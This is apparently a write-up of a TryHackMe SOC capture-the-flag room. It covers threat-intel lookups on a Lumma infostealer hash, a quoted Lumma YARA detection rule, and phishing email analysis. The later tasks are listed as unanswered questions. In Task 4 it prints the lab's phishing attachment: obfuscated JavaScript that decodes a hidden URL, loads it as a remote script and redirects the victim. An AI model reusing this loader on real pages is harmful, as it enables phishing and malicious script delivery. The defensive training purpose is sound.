```
______ _          _     _____ _     _  __ _     _____ ___________ 
|  ___(_)        | |   /  ___| |   (_)/ _| |   /  __ \_   _|  ___|
| |_   _ _ __ ___| |_  \ `--.| |__  _| |_| |_  | /  \/ | | | |_   
|  _| | | '__/ __| __|  `--. \ '_ \| |  _| __| | |     | | |  _|  
| |   | | |  \__ \ |_  /\__/ / | | | | | | |_  | \__/\ | | | |    
\_|   |_|_|  |___/\__| \____/|_| |_|_|_|  \__|  \____/ \_/ \_|    
```
This THM challenge, is a beginner-friendly CTF featuring six unique scenarios, starting
from quick warmups and classic SOC investigations, escalating to cases that push well
beyond the typical L1 role. [^1]

[Task 3] Probably Just Fine
-----------------------------------------------------------------------------------------
In the first task, we want to investigate the following alert on the SOC dashboard. The
SOC handover notes did mention, that Susan is going to attend a conference in Singapore
but according to the SOC procedure, we still want to verify each IP address. Thus, we
find out that the IP looks suspicious indeed, and upon contacting Susan, we find out that
she did not log in to the company VPN. While using a public WiFi hotspot at a café, she
was however prompted to install a "security check" tool, which she did.

> Unusual VPN login of susan.martin[@]probablyfine[.]thm from 37[.]19[.]201[.]132
> (Singapore) and a suspicious binary with the hash
> b8e02f2bc0ffb42e8cf28e37a26d8d825f639079bf6d948f8debab6440ee5630.

For this, we are given a threat intelligence database, similar to VirusTotal to check the
reputation and other details of IP addresses, domains and file hashes. The host telemetry
further reveals a suspicious binary with the hash.

### What is the ASN number related to the IP?
First, we run a lookup scan of the IP address with `whois <IP_ADDRESS>` to get the 
*Autonomous System Number* (ASN) number in the origin information. And indeed, we thus
discover the AS followed by the number that we can enter for this task.

### Which service is offered from this IP?
From simply reading the introduction to this task, we are informed what service is
offered from this IP address.

### What is the filename of the file related to the hash?
This task requires us to copy the filehash from the introduction and paste it into the
search bar of *TryDetectThis 2.0* [^2] and from this public knowledge, we can now see the
file name as it is listed under the basic properties.

### What is the threat signature that Microsoft assigned to the file?
Under the *Vendor Analysis* there is also *Microsoft* listed as a vendor and under the
detection name, we can discover the threat signature.

### Based on its HTTPS certificate, how many domains are linked to the same campaign?
One of the contacted domains is part of a large malicious infrastructure cluster. From
the list of contacted domains that the file is communicating with, there are a few that
stand out to be a possible C2 endpoint, payload delivery or secondary redirect. So, we
start by analyzing the domain `gadgethgfub[.]icu` in our custom VirusTotal instance. And
under the HTTPS Certificate Data, we can click on the latest certificate with a whole
list of alternative names, as can be seen in `subject_alternative_names.txt`. The total
amount of alternative names equals the count of domains that are linked to this very same
campaign for this task.

### What line is present in the YARA rule's "condition" field by "kevoreilly"?
For the file hash, there is one YARA rule "Lumma Payload" from the author "kevoreilly".
We further investigate this rule in the GitHub page [^3] and present it below together
with the condition field:
```
rule Lumma {
  meta:
    author = "kevoreilly"
    description = "Lumma Payload"
    cape_type = "Lumma Payload"
    packed = "0ee580f0127b821f4f1e7c032cf76475df9724a9fade2e153a69849f652045f8"
    packed = "23ff1c20b16d9afaf1ce443784fc9a025434a010e2194de9dec041788c369887"
  strings:
    $decode1 = {C1 (E9|EA) 02 [0-3] 0F B6 (44|4C) ?? FF 83 (F8|F9) 3D 74 05 83 (F8|F9) 2E 75 01 (49|4A) [0-30] 2E 75}
    $decode2 = {B0 40 C3 B0 3F C3 89 C8 04 D0 3C 09 77 06 80 C1 04 89 C8 C3 89 C8 04 BF 3C}
    $decode3 = {B0 40 C3 B0 3F C3 80 F9 30 72 ?? 80 F9 39 77 06 80 C1 04 89 C8 C3}
    $decode4 = {89 C8 04 D0 3C 09 77 ?? [3-11] 89 C8 [0-1] C3 89 C8 04 BF 3C 1A 72 ?? 89 C8 04 9F 3C}
  condition:
    uint16(0) == 0x5a4d and any of them
}
```

### What is the title of the TI report mentioning this hash?
In the *Detections and Reports* tab of TryDetectThis 2.0, we can discover the report [^4]
that presents the Lumma infostealer threat analysis. This report analyzes in detail, how
Lumma operates as part of a decentralized cybercrime ecosystem, showing a wide range of
tools and underground services to steal credentials, evade detection, run multiple scams,
and monetize stolen data.

### Which team did the author of the malware start collaborating with in early 2024?
By reading the report, we find out the crucial information on the team, that Lumma began
collaborating with in early 2024. This affiliated SOCKS5 proxies from infected bots, as
the team provided a residential proxy plugin.

### Which mentioned infostealer targets Android systems?
A Mexican-based affiliate related to the malware family also uses other infostealers.
Following the use of additional infostealers alongside Lumma in the article, we also
discover an Android-based *Remote Access Trojan* (RAT), based on Telegram profile images
likely tied to the affiliate.

### Which MITRE ATT&CK sub-technique does this align with?
The report states that the affiliates behind the malware use the services of AnonRDP. In
the *Appendix C: MITRE ATT&CK Techniques*, we discover a listing of techniques and their
matching ATT&CK code. Since this service focuses on VPN's we choose the *Acquire
Infrastructure: Virtual Private Server* sub-tactic to be best aligned with the described
attack on "Probably Just Fine".

[Task 4] Phishing Books
-----------------------------------------------------------------------------------------
In the second task, we are in charge of monitoring alerts from universities in London
through our SOC dashboard. Then, we get an email from a university teacher, that raises
our interest.

> Subject: MFA Removal Requests<br>
> From: Dr. Isabella <isabella[@]kingford[.]ac[.]uk><br><br>
> Hey, ProbablyFine SOC Team,<br>
> I've been getting several emails asking me to approve my MFA.<br>
> Are you performing any tests? Should I approve these requests?<br>
> Dr. Isabella

So, we immediately contact Dr. Isabella, as it is clear she has been targeted in a
phishing campaign. Further, we want to investigate the original `.eml` file to find out
if this was an isolated hit, or part of a larger scheme targeting universities.

### Which specific check within the headers explains the bypass of email filters?
First, we check the *arch-authentication-results* to check whether any of the following
headers are marked as failed or none, indicating an authentication failure. And indeed,
all three of them are marked as none, i.e. `dkim=none, spf=none, dmarc=none`. Out of the
three signatures, there is one that should be considered for this task, because it does
not to specify how email receivers should handle emails that fail authentication.

### What technique did the attacker use to make the message seem legitimate?
The attacker's domain `kinglord[.]ac[.]uk` is very similar to the legitimate domain
`kingford[.]ac[.]uk`. Further, we discover in the email, that the sender's domain
`thelondouniversity[.]ac[.]uk` is just missing an *n* before *university* to be exactly
the legitimate email domain `thelondonuniversity[.]ac[.]uk`. The solution to this task
is the technique that describes the registration of a lookalike domain to fool a victim
into believing the message is from a legitimate source.

### Which MITRE technique and sub-technique ID best fit this sender address trick?
For this, we enter "MITRE Technique" followed by the previous solution in the search bar
of a search engine of our choice and thus get prompted with the code, that describes how
adversaries may acquire domains that can be used during targeting. Adversaries may choose
domains that are similar to legitimate domains, including through use of homoglyphs or
use of a different *Top-Level Domain* (TLD). [^5]

### What is the file extension of the attached file?
By importing the phishing email into the mail application *Evolution*, we can download
the potentially malicious attachment and log the file extension for this task.

### What is the MD5 hash of the .HTML file?
In the *EML-Analysis-Report.html* we can scroll down to attachments and have a look at
the investigation key and values. Here, we can search the MD5 hash in VirusTotal which is
also the answer for this task. Alternatively, we can also run the command `md5sum` on the
*library-invoice.pdf.html* attachment to get the MD5 hash.

### What is the landing page of the phishing attack?
After the static analysis of the attack, we can now move on to the dynamic analysis in
a controlled environment, i.e. virtual machine. Therefore, we open the phishing HTML page
*library-invoice.pdf.html* and log the landing page's URL.

### Which MITRE technique ID was used inside the attached file?
Upon opening the attached file in a text editor, we discover an unknown type of
JavaScript obfuscation for the variables `xanthium` and `egassem`. So, we google for the
MITRE technique ID for obfuscated files or information and discover one with 17
sub-techniques. Here, the description "adversaries may attempt to make an exectuable or
file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating
its contents on the system or transit" [^6] is fitting perfectly to what the attackers
did here.

### What is the hidden message the attacker left in the file?
From the previous task already, we discovered some variables with obfuscated content and
now we aim for its decryption to find out the hidden message.
```html
<!doctype html>
<html>
  <body>
    <script>
    var xanthium = [
      "\u0032\u0038\u0030\u0038\u003a",              
      "\u006d\u006f\u0063\u002e",                          
      "\u0032\u0033\u0034\u0032\u0033\u0065\u0077\u0063\u0033\u0031\u002d",
      "\u0075\u006c\u0074\u0079\u0072\u0061\u0072\u0062\u0069\u0456\u006c", 
      "\u002f\u002f\u003a\u0070\u0074\u0074\u0068"              
    ];
    var egassem = [
      "\u005e\u005e\u0020\u0073\u0065\u0069\u0072\u0061\u0072",
      "\u0062\u0069\u006c\u0020\u006d\u006f\u0072\u0066\u0020",
      "\u0073\u006b\u006f\u006f\u0062\u0020\u0068\u0073",
      "\u0069\u0068\u0070\u0020\u006f\u0074\u0020",
      "\u0065\u0076\u006f\u006c\u0020\u0049"      
    ];

    var reversed = xanthium.join("");
    var src = reversed.split("").reverse().join("");

    var reversed = egassem.join("");
    var mes = reversed.split("").reverse().join("");

    document.body.appendChild(Object.assign(document.createElement("script"), { src: src }));
    window.location.replace(src);
    </script>
  </body>
</html>
```
In the `deobfuscated_variables.js` file we now provide the steps to decrypt the content
of the `xanthium` and `egassem` variables which contain Unicode escape sequences. In it,
we decode each UTF-16 unit into human-readable characters and concatenate them. Then, we
can either paste the script contents into the browser console of our choice or use the
*Node.js* command `node deobfuscated_variables.js` in our terminal. Finally, we get the
contents of the two variables but they are reversed, which can be easily undone with
`echo "<REV_MESSAGE>" | rev`. Note, to log the hidden message for this task and keep the
URL in a safe place.

### Which line in the attached file is responsible for decoding the URL redirect?
In the contents of the `library-invoice.pdf.html` file from the previous tasks, we can
locate the line that reverses the contents of the `xanthium` variable and joins the
characters for this task.

### What is the first URL in the redirect chain?
Upon entering the decoded URL into the address bar of a a browser in the safe environment
we are redirected to the `lib-service[.]com:8083` malicious site. However, for this task,
the *Referer* URL with protocol and port number is the answer.

### What is the Threat Actor associated with this malicious file and/or URL?
Again, we investigate the information contained in the *EML-Analysis-Report.html* try to
access the VirusTotal links which are empty. Instead, we copy the malicious site URL
`library.kingford.ac.uk` into the internal VirusTotal clone *TryDetectThis 2.0* [^7] and
investigate the *Whois* data. The adversary, i.e. threat actor's name is listed above it.

### What is the main target of this Threat Actor according to MITRE?
Since we have not heard of this adversary group before, we search for it in a search
engine of our choice and directly land at the MITRE group overview [^8] describing this
group. Here, we are informed of their main target and their affiliates, the government of
Iran, specifically the *Islamic Revolutionary Guard Corps* (IRGC).

[Task 5] Portal Drop
-----------------------------------------------------------------------------------------

### What is the IP address that initiated the brute force on the CRM web portal?

### How many successful and failed logins are seen in the logs?
Answer Example: 42, 56

### Following the brute force, which user-agent was used for the file upload?

### What was the name of the suspicious file uploaded by the attacker?

### At what time did the attacker first invoke the uploaded script?
Answer Example: 2025-10-24 15:35:50

### What is the first decoded command the attacker ran on the CRM?

### Based on the attacker’s activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?

### Which process image executes attacker commands received from the web?

### What command allowed the attacker to open a bash reverse shell?

### Which Linux user executes the entered malicious commands?

### What sensitive CRM configuration file did the attacker access? 

### Which domain was used to exfiltrate the CRM portal database?

### What flag do you get after completing all 12 EDR response actions?

[Task 6] Zero Tolerance
-----------------------------------------------------------------------------------------

### What is the hostname where the Initial Access occurred?

### What MITRE subtechnique ID describes the initial code execution on the beachhead?

### What is the full path of the malicious file that led to Initial Access?

### What is the full path to the LOLBin abused by the attacker for Initial Access?

### What is the IP address of the attacker's Command & Control server?

### What is the full path of the process responsible for the C2 beaconing?

### What is the full path, modified for Persistence on the beachhead host?

### What tool and parameter did the threat actor use for credential dumping?

### What security parameter did they attempt to change?
The threat actor executed a command to evade defenses.

### What is the process ID (PID) that executed the remote command?
The threat actor used a tool to execute remote commands on other machines.

### At what time did the threat actor pivot from the beachhead to another system?
Answer format: YYYY-MM-DD HH:MM:SS

### What is the full path of the PowerShell script used by the threat actor to collect data?

### What are the first 4 file extensions targeted by this script for exfiltration?
Answer format: Chronological, comma-separated

### What is the full path to the staged file containing collected files?

[Task 7] The Crown Jewel
-----------------------------------------------------------------------------------------

### From which internal IP did the suspicious connection originate?

### What outbound connection was detected as a C2 channel? (Answer example: 1.2.3.4:9996)

### Which MAC address is impersonating the gateway 10.10.10.1?

### What is the non-standard User-Agent hitting the Jira instance?

### How many ARP spoofing attacks were observed in the PCAP?

### What's the payload containing the plaintext creds found in the POST request?

### What domain, owned by the attacker, was used for data exfiltration?

### After examining the logs, which protocol was used for data exfiltration?

[Task 8] Promotion Night
-----------------------------------------------------------------------------------------

### What was the network share path where ransomware was placed?

### What is the value ransomware created to persist on reboot?

### What was the most likely extension of the encrypted files?

### Which MITRE technique ID was used to deploy ransomware?

### What ports of SRV-ITFS did the adversary successfully scan?

### What is the full path to the malware that performed the Discovery?

### Which artifact did the adversary create to persist on the beachhead?

### What is the MD5 hash of the embedded initial shellcode?

### Which C2 framework was used by the adversary in the intrusion?

### What hostname did the adversary log in from on the beachhead?

### What was the UNC path that likely contained AWS credentials?

### From which IP address did the adversary access AWS?

### Which two sensitive files did the adversary exfiltrate from AWS?

### What file did the adversary upload to S3 in place of the wiped ones?

[^1]: https://tryhackme.com/room/first-shift-ctf
[^2]: https://static-labs.tryhackme.cloud/apps/trydetectthis/
[^3]: https://github.com/kevoreilly/CAPEv2/blob/master/data/yara/CAPE/Lumma.yar
[^4]: https://www.recordedfuture.com/research/behind-the-curtain-how-lumma-affiliates-operate
[^5]: https://attack.mitre.org/techniques/T1583/001/
[^6]: https://attack.mitre.org/techniques/T1027/
[^7]: https://static-labs.tryhackme.cloud/apps/trydetectthis/report/lib-service.com
[^8]: https://attack.mitre.org/groups/G0122/
